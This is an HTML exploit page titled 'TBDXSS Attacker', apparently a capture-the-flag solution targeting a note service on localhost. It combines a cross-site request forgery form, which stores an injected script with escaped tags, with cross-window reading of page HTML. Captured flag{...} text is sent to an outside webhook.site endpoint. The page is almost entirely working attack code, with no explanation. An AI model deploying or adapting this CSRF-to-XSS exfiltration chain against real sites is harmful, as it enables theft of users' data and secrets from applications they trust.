<!DOCTYPE html>
<html>
    <head>
        <title>TBDXSS Attacker</title>
    </head>
    <body>
        <img src="http://34.123.246.143:5000/error" onerror="window.location.href='http://localhost:10001/note'">
        <form id="form" method="POST" action="http://localhost:10001/change_note" target="_blank">
            <textarea id="dataField" name="data"></textarea>
            <input type="submit" value="submit">
        </form>
        <script>
            window.open('https://webhook.site/ce587c88-e8e2-4397-9cb7-df2c22c5f8bb/FLEKK', 'testWindow')
            window.open('http://localhost:10001/note', 'flagWindow')
            
            dataField.value = `
                \x3cscript>
                    const flagWindow = window.open('', 'flagWindow');
                    const flagHTML = flagWindow.document.documentElement.innerHTML;
                    window.location.href = 'https://webhook.site/ce587c88-e8e2-4397-9cb7-df2c22c5f8bb/FLAG_' + (/flag{.+?}/).exec(flagHTML)[0];
                \x3c/script>
            `
            form.submit()
        </script>
    </body>
</html>